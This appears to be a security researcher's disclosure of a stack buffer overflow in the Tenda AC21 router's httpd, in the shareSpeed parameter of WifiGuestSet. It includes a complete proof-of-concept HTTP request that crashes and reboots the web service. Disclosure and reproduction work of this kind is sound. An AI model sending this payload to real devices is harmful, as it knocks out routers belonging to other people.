# Tenda AC21(V16.03.08.15) contains Stack Buffer Overflow Vulnerability

## overview

- Manufacturer's website information：https://www.tenda.com.cn/
- Firmware download address: https://www.tenda.com.cn/download/detail-3419.html

## product information

Tenda A21(V16.03.08.15), latest version of simulation overview：

![image-20220902192028747](readme.assets/image-20220902192028747.png)

## description

### 1. Vulnerability Details

Tenda AC21(V16.03.08.15) contains a stack overflow vulnerability in file `/bin/httpd`, function`fromSetWifiGusetBasic`

Attacker can use this vulnerability via the`shareSpeed` parameter.

![image-20220902200821585](readme.assets/image-20220902200821585.png)

it calls `strcpy(v12, v7)` and `v12` is on the stack, so there is a stack buffer overflow vulnerability. 

### 2. Recurring loopholes and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
POST /goform/WifiGuestSet HTTP/1.1
Host: 192.168.0.1
Content-Length: 23
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/system_time.html?random=0.9865714904007963&
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

shareSpeed=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```

By sending this poc, we can cause `httpd` reboot. 

![image-20220902201539206](readme.assets/image-20220902201539206.png)

![image-20220902201547354](readme.assets/image-20220902201547354.png)